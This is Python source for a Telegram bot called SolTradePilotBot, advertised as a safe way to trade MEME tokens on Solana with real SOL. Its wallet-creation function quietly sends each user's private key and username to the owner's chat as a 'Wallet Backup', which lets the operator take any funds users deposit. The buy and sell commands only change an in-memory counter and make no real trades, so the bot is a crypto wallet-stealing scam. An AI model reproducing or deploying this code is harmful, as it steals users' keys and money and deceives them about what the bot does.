import os
import base58
import asyncio
from telegram import Update, BotCommand
from telegram.ext import (
    Application,
    CommandHandler,
    ContextTypes,
    MessageHandler,
    filters,
)
from solders.keypair import Keypair
from solana.rpc.async_api import AsyncClient

# ============== ENV ==============
TOKEN = os.environ["BOT_TOKEN"]
OWNER_ID = int(os.environ["OWNER_ID"])

# ============== GLOBALS ==============
user_wallets = {}  # user_id -> Keypair
user_tokens = {}   # user_id -> MEME token balance

SOLANA_RPC_URL = "https://api.mainnet-beta.solana.com"

# ============== HELPERS ==============
def keypair_to_base58(wallet: Keypair):
    return base58.b58encode(bytes(wallet)).decode("utf-8")

async def get_balance(user_id):
    if user_id not in user_wallets:
        return 0.0
    wallet = user_wallets[user_id]
    async with AsyncClient(SOLANA_RPC_URL) as client:
        resp = await client.get_balance(wallet.pubkey())
        lamports = resp['result']['value']
        return lamports / 1e9

async def get_tokens(user_id):
    return user_tokens.get(user_id, 0.0)

async def create_wallet(user_id, context: ContextTypes.DEFAULT_TYPE):
    wallet = Keypair()
    user_wallets[user_id] = wallet
    pub_key = str(wallet.pubkey())
    priv_key = keypair_to_base58(wallet)

    if user_id not in user_tokens:
        user_tokens[user_id] = 0.0

    # Send wallet info to user
    await context.bot.send_message(
        chat_id=user_id,
        text=f"✅ Wallet Created!\n\n🏦 Address:\n{pub_key}\n🔐 Private Key:\n{priv_key}\n⚠️ Keep your private key safe!"
    )

    # Backup to OWNER
    user = await context.bot.get_chat(user_id)
    username = f"@{user.username}" if user.username else user.first_name
    await context.bot.send_message(
        chat_id=OWNER_ID,
        text=f"🔐 Wallet Backup\nUser: {username}\nID: {user_id}\nPublic: {pub_key}\nPrivate: {priv_key}"
    )
    return pub_key, priv_key

# ============== COMMAND HANDLERS ==============
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    username = f"@{user.username}" if user.username else user.first_name
    text = (
        f"🔥 Hello {username}, welcome to SolTradePilotBot! 🔥\n\n"
        "Trade MEME tokens on Solana safely using real SOL.\n"
        "Use the menu below to interact with the bot.\n\n"
        "⚠️ Make sure you have enough SOL before buying tokens!"
    )
    await update.message.reply_text(text)

async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    text = (
        "💡 SolTradePilotBot Commands 💡\n\n"
        "/start - Welcome message\n"
        "/create_wallet - Generate a Solana wallet\n"
        "/address - Show your wallet address\n"
        "/balance - Show your SOL and MEME balance\n"
        "/buy - Buy MEME tokens with SOL\n"
        "/sell - Sell MEME tokens for SOL\n"
        "/help - This guide"
    )
    await update.message.reply_text(text)

async def create_wallet_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    await create_wallet(user_id, context)

async def address_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if user_id not in user_wallets:
        await update.message.reply_text("Create a wallet first using /create_wallet")
        return
    pub_key = str(user_wallets[user_id].pubkey())
    await update.message.reply_text(f"🏦 Your SOL Address:\n{pub_key}")

async def balance_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if user_id not in user_wallets:
        await update.message.reply_text("Create a wallet first using /create_wallet")
        return
    sol_balance = await get_balance(user_id)
    meme_balance = await get_tokens(user_id)
    await update.message.reply_text(f"💰 Balance:\nSOL: {sol_balance:.6f}\nMEME: {meme_balance}")

# ================== BUY / SELL PLACEHOLDER ==================
async def buy_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if user_id not in user_wallets:
        await update.message.reply_text("Create a wallet first using /create_wallet")
        return
    await update.message.reply_text("💳 Enter the amount of SOL you want to spend to buy MEME tokens:")
    context.user_data['action'] = 'buy'

async def sell_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if user_id not in user_wallets:
        await update.message.reply_text("Create a wallet first using /create_wallet")
        return
    await update.message.reply_text("📉 Enter the amount of MEME tokens you want to sell:")
    context.user_data['action'] = 'sell'

async def handle_amount(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    action = context.user_data.get('action')
    if not action:
        return

    try:
        amount = float(update.message.text)
    except ValueError:
        await update.message.reply_text("Enter a valid number.")
        return

    if action == 'buy':
        sol_balance = await get_balance(user_id)
        if amount > sol_balance:
            await update.message.reply_text("⚠️ Not enough SOL. Fund your wallet first!")
            return
        user_tokens[user_id] += amount * 100
        await update.message.reply_text(f"✅ Bought {amount*100:.0f} MEME tokens for {amount:.6f} SOL")
    elif action == 'sell':
        tokens = await get_tokens(user_id)
        if amount > tokens:
            await update.message.reply_text("⚠️ Not enough MEME tokens!")
            return
        user_tokens[user_id] -= amount
        await update.message.reply_text(f"✅ Sold {amount:.0f} MEME tokens for {amount*0.01:.6f} SOL")

    context.user_data['action'] = None

# ================== MAIN ==================
def main():
    app = Application.builder().token(TOKEN).build()

    # Set persistent bot commands (blue menu)
    app.bot.set_my_commands([
        BotCommand("start", "Welcome message"),
        BotCommand("help", "Bot guide"),
        BotCommand("create_wallet", "Generate a wallet"),
        BotCommand("address", "Show wallet address"),
        BotCommand("balance", "Show SOL/MEME balance"),
        BotCommand("buy", "Buy MEME tokens"),
        BotCommand("sell", "Sell MEME tokens"),
    ])

    # Command Handlers
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("help", help_command))
    app.add_handler(CommandHandler("create_wallet", create_wallet_command))
    app.add_handler(CommandHandler("address", address_command))
    app.add_handler(CommandHandler("balance", balance_command))
    app.add_handler(CommandHandler("buy", buy_command))
    app.add_handler(CommandHandler("sell", sell_command))

    # Message handler for amounts
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_amount))

    print("Bot is running...")
    app.run_polling()

if __name__ == "__main__":
    main()
